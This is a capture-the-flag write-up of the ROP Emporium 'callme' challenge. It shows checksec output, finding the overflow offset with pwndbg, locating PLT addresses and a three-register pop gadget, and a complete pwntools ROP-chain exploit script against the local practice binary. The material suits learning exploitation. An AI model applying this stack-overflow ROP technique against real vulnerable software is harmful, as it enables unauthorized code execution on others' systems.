First of all, use checksec to get some binary information
```shell
[marco@marco-pc callme]$ file callme 
callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=00e98079187631025159f040444e55bed3edcf1c, not stripped
[marco@marco-pc callme]$ checksec --file='callme'
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          RW-RPATH   No RUNPATH   82 Symbols     No	0		3	callme
```

ROP Emporium tell us:
*You must call callme_one(), callme_two() and callme_three() in that order, each with the arguments 1,2,3 e.g. callme_one(1,2,3) to print the flag.*

Before searching functions address, we find out how many bytes are to be filled before RIP
```gdb
gdb-pwndbg callme

...

pwndbg> cyclic 50
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
pwndbg> r
Starting program: /home/marco/Downloads/callme/callme 
callme by ROP Emporium
64bits

Hope you read the instructions...
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.

...

RBP  0x6161616a61616169 ('iaaajaaa')

...

pwndbg> cyclic -l 'iaaa'
32
```

As we have seen with `checksec`, the program is not stripped and there isn't PIE (no randomization). This means that we can look up the address of the 3 functions in the binary.
```gdb
[marco@marco-pc callme]$ gdb-pwndbg callme 
Reading symbols from callme...
(No debugging symbols found in callme)
pwndbg: loaded 181 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> i functions
All defined functions:

Non-debugging symbols:
0x00000000004017c0  _init
0x00000000004017f0  puts@plt
0x0000000000401800  printf@plt
0x0000000000401810  callme_three@plt
0x0000000000401820  memset@plt
0x0000000000401830  __libc_start_main@plt
0x0000000000401840  fgets@plt
0x0000000000401850  callme_one@plt
0x0000000000401860  setvbuf@plt
0x0000000000401870  callme_two@plt
0x0000000000401880  exit@plt
0x0000000000401890  __gmon_start__@plt
0x00000000004018a0  _start
0x00000000004018d0  deregister_tm_clones
0x0000000000401910  register_tm_clones
0x0000000000401950  __do_global_dtors_aux
0x0000000000401970  frame_dummy
0x0000000000401996  main
0x0000000000401a05  pwnme
0x0000000000401a57  usefulFunction
0x0000000000401ab0  usefulGadgets
0x0000000000401ac0  __libc_csu_init
0x0000000000401b30  __libc_csu_fini
0x0000000000401b34  _fini
```

Last thing we need to build our exploit, is a gadget that pop 3 arguments from the stack into RDI, RSI, RDX (x64 calling convention).
```shell
[marco@marco-pc callme]$ ROPgadget --binary="callme" > gadgets
[marco@marco-pc callme]$ cat gadgets | grep pop
0x00000000004018fc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004018fe : add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401aae : add byte ptr [rax], al ; pop rdi ; pop rsi ; pop rdx ; ret
0x0000000000401aad : add byte ptr [rax], r8b ; pop rdi ; pop rsi ; pop rdx ; ret
0x0000000000401aaf : add byte ptr [rdi + 0x5e], bl ; pop rdx ; ret
0x00000000004018ed : je 0x401908 ; pop rbp ; mov edi, 0x602078 ; jmp rax
0x000000000040193b : je 0x401950 ; pop rbp ; mov edi, 0x602078 ; jmp rax
0x00000000004019fe : mov eax, 0 ; pop rbp ; ret
0x00000000004018f8 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x0000000000401aab : nop dword ptr [rax + rax] ; pop rdi ; pop rsi ; pop rdx ; ret
0x0000000000401945 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000401b1c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401b1e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401b20 : pop r14 ; pop r15 ; ret
0x0000000000401b22 : pop r15 ; ret
0x0000000000401962 : pop rbp ; mov byte ptr [rip + 0x20073e], 1 ; ret
0x00000000004018ef : pop rbp ; mov edi, 0x602078 ; jmp rax
0x0000000000401b1b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401b1f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401900 : pop rbp ; ret
0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret
0x0000000000401b23 : pop rdi ; ret
0x0000000000401ab2 : pop rdx ; ret
0x0000000000401b21 : pop rsi ; pop r15 ; ret
0x0000000000401ab1 : pop rsi ; pop rdx ; ret
0x0000000000401b1d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004018fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
```

gadget `*0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret*` seems to be perfect!

Final exploit:
NOTE: remeber to add 8 byte to overflow the buffer (32 to RBP + 8 to RIP)
```python
from pwn import *

callme_one = 0x0000000000401850
callme_two = 0x0000000000401870
callme_three = 0x0000000000401810
pop_3 = 0x0000000000401ab0

shellcode = ("A"*40).encode()
shellcode += p64(pop_3)
shellcode += p64(0x1)
shellcode += p64(0x2)
shellcode += p64(0x3)
shellcode += p64(callme_one)

shellcode += p64(pop_3)
shellcode += p64(0x1)
shellcode += p64(0x2)
shellcode += p64(0x3)
shellcode += p64(callme_two)

shellcode += p64(pop_3)
shellcode += p64(0x1)
shellcode += p64(0x2)
shellcode += p64(0x3)
shellcode += p64(callme_three)

p = process('./callme')
p.recvuntil('>')
p.sendline(shellcode)
print(p.recvall().decode())
```
